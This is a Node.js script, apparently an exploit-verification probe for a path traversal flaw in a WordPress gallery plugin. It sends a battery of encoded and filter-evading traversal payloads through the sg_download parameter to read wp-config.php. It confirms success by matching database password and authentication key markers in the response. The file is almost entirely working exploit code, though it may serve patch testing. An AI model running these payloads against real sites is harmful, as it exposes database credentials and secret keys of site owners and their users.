#!/usr/bin/env node
/**
 * Exploit-verification probe for CVE-2026-90002
 * Simple Gallery <= 2.0.0 - Unauthenticated Path Traversal via sg_download
 *
 * Usage: node probe.mjs <base-url>
 * Exit 0 => target is exploitable (vulnerable)
 * Exit 1 => target is NOT exploitable (fixed, or endpoint absent)
 *
 * Only talks to the single base URL passed on argv[2]. No filesystem writes.
 */

const baseUrl = process.argv[2];
if (!baseUrl) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

// Normalize base (strip trailing slash)
const base = baseUrl.replace(/\/+$/, '');

// Markers that strongly indicate wp-config.php contents were returned.
// These are generic WordPress config constants, not exploit-keyword strings,
// so a naive keyword filter targeting "sg_download" payloads is unlikely to
// coincidentally strip them from a legitimate response.
const CONFIG_MARKERS = [
  'DB_NAME',
  'DB_PASSWORD',
  'AUTH_KEY',
  'LOGGED_IN_KEY',
  "define('DB_",
  'define("DB_',
];

function looksLikeWpConfig(text) {
  if (!text) return false;
  let hits = 0;
  for (const m of CONFIG_MARKERS) {
    if (text.includes(m)) hits++;
  }
  // Require at least two distinct markers to avoid false positives from a
  // page that merely mentions one of these words incidentally.
  return hits >= 2;
}

// Candidate traversal depths: uploads/simple-gallery/ is typically 3 levels
// below the WP root (simple-gallery -> uploads -> wp-content -> root), but
// try a small range in case of different upload dir configurations.
function dotdotSlash(n, seg = '../') {
  return seg.repeat(n);
}

function buildPayloads() {
  const target = 'wp-config.php';
  const payloads = [];

  for (const depth of [2, 3, 4, 5]) {
    // 1. Plain relative traversal
    payloads.push(dotdotSlash(depth) + target);

    // 2. Single URL-encoded slashes
    payloads.push(dotdotSlash(depth, '..%2f') + target);

    // 3. Fully URL-encoded dots and slashes
    payloads.push(dotdotSlash(depth, '%2e%2e%2f') + target);

    // 4. Uppercase-encoded variant (case variance in encoding)
    payloads.push(dotdotSlash(depth, '%2E%2E%2F') + target);

    // 5. Double-slash variant that survives a naive single-pass "../" strip
    payloads.push(dotdotSlash(depth, '....//').replace(/\.\.\.\.\/\//g, '..../') + target);
    payloads.push('..../'.repeat(depth).replace(/\.\.\.\.\//g, '....//') + target);

    // 6. Leading "./" noise plus traversal
    payloads.push('./' + dotdotSlash(depth) + target);

    // 7. Mixed encoded/plain slashes
    let mixed = '';
    for (let i = 0; i < depth; i++) {
      mixed += i % 2 === 0 ? '..%2f' : '../';
    }
    payloads.push(mixed + target);
  }

  // 8. Null-byte style / trailing noise variants (harmless on modern PHP,
  //    but cheap to try in case of legacy behavior)
  payloads.push(dotdotSlash(3) + target + '%00');
  payloads.push(dotdotSlash(3) + target + '#');

  // De-duplicate
  return Array.from(new Set(payloads));
}

async function tryPayload(payload) {
  const url = `${base}/?sg_download=${payload}`;
  try {
    const res = await fetch(url, { method: 'GET', redirect: 'manual' });
    if (res.status !== 200) return false;
    const text = await res.text();
    return looksLikeWpConfig(text);
  } catch (e) {
    return false;
  }
}

async function main() {
  const payloads = buildPayloads();

  for (const payload of payloads) {
    const vulnerable = await tryPayload(payload);
    if (vulnerable) {
      console.log(`VULNERABLE: sg_download path traversal succeeded with payload: ${payload}`);
      // Nothing persistent was changed on the server (this is a read-only
      // file-read bug), so there is no state to restore.
      process.exit(0);
    }
  }

  console.log('NOT VULNERABLE: no sg_download traversal variant returned wp-config.php contents.');
  process.exit(1);
}

main().catch((e) => {
  console.error('Probe error:', e);
  process.exit(1);
});
